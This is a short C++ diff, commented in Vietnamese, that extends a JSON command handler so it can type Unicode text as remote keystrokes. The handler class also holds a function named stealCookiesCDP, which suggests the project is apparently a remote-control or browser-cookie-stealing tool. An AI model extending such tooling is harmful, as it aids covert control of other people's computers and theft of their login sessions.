@@ -227,11 +227,23 @@ json ProcessHandlers::stealCookiesCDP(const json &req)
 
 json ProcessHandlers::handleKeyboardInput(const json &req)
 {
-    std::string key = req.value("key", "");
-    int keyCode = req.value("keyCode", 0);
-
-    // Gọi hàm giả lập phím
-    KeyboardControl::HandleInput(key, keyCode);
+    // Trường hợp 1: Nhận chuỗi văn bản (Tiếng Việt/Ký tự)
+    if (req.contains("text"))
+    {
+        std::string textUtf8 = req.value("text", "");
+        if (!textUtf8.empty())
+        {
+            std::wstring textWide = ToWide(textUtf8);
+            KeyboardControl::SendUnicodeString(textWide);
+        }
+    }
+    // Trường hợp 2: Nhận phím chức năng (Enter, Backspace, Ctrl...)
+    else if (req.contains("key") || req.contains("keyCode"))
+    {
+        std::string key = req.value("key", "");
+        int keyCode = req.value("keyCode", 0);
+        KeyboardControl::HandleInput(key, keyCode);
+    }
 
     return {};
 }
